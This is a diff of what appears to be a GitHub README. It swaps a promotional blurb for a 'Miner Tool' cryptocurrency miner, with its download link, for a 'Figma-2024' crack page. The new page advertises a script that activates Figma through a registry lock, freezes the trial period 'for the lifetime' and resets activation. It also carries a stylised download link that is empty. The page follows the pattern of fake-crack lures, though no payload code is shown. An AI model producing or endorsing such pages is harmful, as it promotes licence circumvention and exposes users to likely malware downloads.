@@ -1,22 +1,27 @@
-Miner Tool is designed to be easy to use, even for beginners. 
-It features a simple and intuitive interface that makes it easy to configure your mining settings and monitor your progress. 
-Miner Tool also includes a number of advanced features, such as support for multiple GPUs, overclocking, and custom fan profiles.
+# Figma-2024
 
-Here is a summary of what Miner Tool can do:
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
 
-• Mine cryptocurrencies using GPUs
+## Figma-activation-license
 
-• Support for multiple mining algorithms
+# Requirements:
+Windows 10/11
 
-• Mine a variety of cryptocurrencies
+# Features:
+```
+## Activation license
 
-• Easy-to-use graphical user interface
+> This script applies the registry lock method to activate
+> This method requires the Internet at the time of activation.
 
-• Advanced features for experienced miners
+## Freeze Trial
 
-Miner Tool is a powerful and versatile mining tool that can be used by both beginners and experienced miners. It is available for free download on Windows, Linux, and macOS.
+> Freeze 30-day trial period, you can use this option in the script to lock this trial period for the lifetime so that you won�t have to reset the trial again and your trial won�t expire.
+> This method requires the Internet at the time of applying this option
 
-## Disclaimer: 
-Mining cryptocurrencies can be a profitable way to earn money, but it is also important to remember that it can be a competitive and energy-intensive process. 
-Before you start mining, it is important to do your research and make sure that you have the necessary hardware and software.
-[download](https://github.com/skidfromdao/Miner-Tool/releases)
+## Reset Activation/Trial
+
+> You can use this script to reset this Activation / Trial period whenever you want.
+```
+
+![4cc7732def86bf69bb2091337570327f (1)](https://github.com/XBLU18/Figma-2024/assets/147840930/af04b969-e786-4408-9345-0ff620b1cc05)
